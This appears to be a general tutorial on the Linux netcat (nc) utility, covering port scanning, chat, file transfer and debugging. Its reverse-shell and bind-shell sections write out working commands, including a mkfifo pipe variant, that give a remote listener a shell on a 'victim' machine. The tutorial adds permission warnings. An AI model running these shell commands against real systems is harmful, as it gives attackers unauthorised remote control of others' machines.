Markdown

# Linux `nc` (Netcat) Command Tutorial (Detailed)

`nc` (Netcat) is a versatile command-line utility in Linux known as the "TCP/IP Swiss Army Knife." It's used for reading from and writing to network connections using TCP or UDP. `nc` can be used for a wide range of tasks, including port scanning, file transfers, simple chat servers, network debugging, and creating basic client/server interactions.

## Basic Syntax

```bash
nc [OPTIONS] [HOST] [PORT]
OPTIONS: Control nc's behavior (e.g., listen, verbose, UDP, zero-I/O).

HOST: The hostname or IP address to connect to (client mode) or bind to (server mode).

PORT: The port number to connect to or listen on.

Key Concepts and Modes
nc operates in two primary modes:

Client Mode: Connects to a listening service on a remote host and port.

Server Mode (Listen Mode): Listens for incoming connections on a specified port.

Common Options
-l (or --listen): Listen mode. nc will listen for an incoming connection rather than initiating one.

-p PORT (or --source-port PORT): Specify the source port for client connections (usually unnecessary).

-u (or --udp): UDP mode. Use UDP instead of the default TCP.

-v (or --verbose): Verbose output. Prints diagnostic information to stderr. Use -vv for even more verbosity.

-w TIMEOUT (or --wait TIMEOUT): Connection timeout. Specifies a timeout for connects, accepts, and inactives.

-z (or --zero): Zero-I/O mode. Only scan for listening daemons, without sending any data. Useful for port scanning.

-n (or --nodns): Numeric-only IP addresses, no DNS lookups.

-L (or --continuelisten): (GNU Netcat only) Listen continuously after the first connection terminates. Usually, nc -l exits after one client disconnects.

-k (or --keep-open): (GNU Netcat only) Force nc to stay listening for another connection after its current client connection is completed. Requires -l.

-c COMMAND (or --sh-exec COMMAND): (GNU Netcat only) Execute COMMAND after connect. Used for simple shell binding.

-e COMMAND (or --exec COMMAND): (BSD/OpenBSD Netcat) Execute COMMAND after connect. Similar to -c but older versions might have different behavior or security implications. Modern GNU nc prefers -c.

Examples and Use Cases
1. Simple Port Scanning (-z)
Use nc to check if a specific port is open on a remote host.

Bash

# Check if port 80 (HTTP) is open on example.com
nc -zv example.com 80

# Check multiple ports on a local host
nc -zv localhost 22 80 443

# Scan a range of ports (using a shell loop)
for port in $(seq 20 25); do nc -zv 192.168.1.1 $port; done
Output Example (nc -zv google.com 443):

Connection to google.com 443 port [tcp/https] succeeded!
2. Basic TCP Client
Connect to a remote server (e.g., a web server) and send/receive data.

Bash

# Connect to Google's web server on port 80
nc google.com 80
Once connected, you can type HTTP requests. For example, type GET / HTTP/1.1 and press Enter twice. You'll see the raw HTTP response.

GET / HTTP/1.1
Host: google.com

HTTP/1.1 301 Moved Permanently
Location: [https://www.google.com/](https://www.google.com/)
Content-Type: text/html; charset=UTF-8
... (rest of HTTP response)
3. Basic TCP Server (Listener)
Set up nc to listen for incoming connections on a specific port.

Terminal 1 (Server):

Bash

nc -l -p 12345
This command makes nc listen on port 12345. It won't output anything until a client connects.

Terminal 2 (Client):

Bash

nc localhost 12345
Now, anything you type in Terminal 2 will appear in Terminal 1, and vice-versa. You've created a simple chat channel! Press Ctrl+C in either terminal to close the connection.

4. File Transfer
nc can be used to quickly transfer files between two machines without setting up an FTP server.

Machine A (Receiver - has IP 192.168.1.100, listening on port 5000):

Bash

nc -l -p 5000 > received_file.txt
Machine B (Sender):

Bash

nc 192.168.1.100 5000 < file_to_send.txt
After the transfer, nc on both sides will usually exit.

5. Simple HTTP Server
You can serve a simple file via HTTP using nc.

Terminal 1 (Server):

Bash

# Create an HTML file
echo -e "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Hello from Netcat!</h1>" > index.html

# Serve it on port 8080. Use '-k' for continuous listening (GNU Netcat).
nc -l -k -p 8080 < index.html
Terminal 2 (Client or Web Browser):

Bash

curl http://localhost:8080
# or open http://localhost:8080 in your web browser
You will see "Hello from Netcat!" in your browser or curl output.

6. Reverse Shell (for security testing/administration)
This is a common technique in penetration testing. It allows a remote attacker (or administrator) to gain shell access to a target machine that is behind a firewall or NAT, by making the target initiate the connection to a listener.

Attacker/Admin Machine (Listener - e.g., IP 1.2.3.4, listening on port 4444):

Bash

nc -l -p 4444
Target Machine (Victim - e.g., IP 192.168.1.100, no open incoming ports):

Bash

# Classic Bash reverse shell
nc 1.2.3.4 4444 -e /bin/bash # For BSD/OpenBSD nc
# For GNU nc (more common on Linux distros)
mkfifo /tmp/f; cat /tmp/f | nc 1.2.3.4 4444 > /tmp/f; rm /tmp/f
# Or simpler for modern GNU nc, if '-c' is available:
nc -c /bin/bash 1.2.3.4 4444
Once the target executes this, the attacker's terminal will get a shell prompt from the target machine.

Security Warning: This is a powerful technique. Only use this on systems you own or have explicit permission to test. Misuse is illegal and unethical.

7. Bind Shell (for security testing/administration)
A bind shell makes the target machine listen on a port, and the attacker connects to it. Less common for external use due to firewalls.

Target Machine (Victim - e.g., IP 192.168.1.100):

Bash

nc -l -p 5555 -e /bin/bash # For BSD/OpenBSD nc
# For GNU nc
nc -l -p 5555 -c /bin/bash
Attacker/Admin Machine (Client):

Bash

nc 192.168.1.100 5555
Once connected, the attacker gets a shell on the target.

8. UDP Communication
Similar to TCP, but uses UDP.

Terminal 1 (UDP Listener):

Bash

nc -l -u -p 12345
Terminal 2 (UDP Sender):

Bash

nc -u localhost 12345
Type messages in either terminal; they will appear in the other. UDP is connectionless, so messages might be lost or arrive out of order, but nc doesn't provide error checking for this.

9. Debugging Network Services
You can manually interact with various network services to debug them.

Bash

# Debug SMTP (port 25)
nc mail.example.com 25
# Then type SMTP commands like:
# HELO example.org
# MAIL FROM:<me@example.org>
# RCPT TO:<you@example.com>
# DATA
# Subject: Test
#
# This is a test email.
# .
# QUIT
Considerations and Best Practices
Security: nc is a very powerful tool. In the wrong hands, it can be used for malicious purposes. Be aware of its capabilities and never run nc -l -e /bin/bash on a production server unless you explicitly know what you are doing and why.

Version Differences: There are different versions of netcat (e.g., GNU Netcat, OpenBSD Netcat, Traditional Netcat). The options, especially -e and -c, can behave differently. Always check your system's man nc page.

Firewalls: nc interactions are subject to firewall rules. If a connection fails, it might be due to a firewall blocking the port.

Temporary Connections: By default, nc -l exits after the first client disconnects. Use -k (GNU Netcat) or loop it in a shell script (while true; do nc -l -p PORT; done) for continuous listening.

Logging: nc itself doesn't offer robust logging. You'll often redirect output to files or pipe it to other tools for logging.

nc is an indispensable tool for network diagnostics, testing, and simple data transfer in a Linux environment. Its flexibility and simplicity make it a favorite among system administrators and security professionals.
```